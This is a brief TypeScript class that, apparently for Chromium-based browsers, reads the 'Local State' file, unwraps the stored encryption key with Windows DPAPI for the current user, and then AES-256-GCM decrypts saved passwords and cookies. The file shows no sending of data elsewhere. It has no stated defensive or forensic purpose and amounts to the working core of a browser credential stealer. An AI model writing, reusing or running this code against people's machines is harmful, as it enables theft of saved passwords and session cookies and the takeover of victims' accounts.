import fs from 'fs'
import path from 'path'
import crypto from 'crypto'

const dpapi = require('win-dpapi')

export class Decrypt {
  private secretKey: string = ''

  constructor() {}

  public captureSecretKey(localState: string): void {
    const stateObject = JSON.parse(fs.readFileSync(localState, 'utf-8'))
    const buff = Buffer.from(stateObject.os_crypt.encrypted_key, 'base64')
    const buffWithout = buff.filter((value, index, arr) => index > 4)
    const key = dpapi.unprotectData(buffWithout, null, 'CurrentUser')

    this.secretKey = key
  }

  public decryptPassword(encryptedPassword) {
    if (!this.secretKey) return null

    const prefix = encryptedPassword.slice(0, 3)
    const iv = encryptedPassword.slice(3, 15)
    const ciphertext = encryptedPassword.slice(15, encryptedPassword.length - 16)
    const authTag = encryptedPassword.slice(encryptedPassword.length - 16)
    const decipher = crypto.createDecipheriv('aes-256-gcm', this.secretKey, iv)

    decipher.setAuthTag(authTag)

    const decryptedCookie = Buffer.concat([decipher.update(ciphertext), decipher.final()])

    return decryptedCookie.toString('utf-8')
  }
}
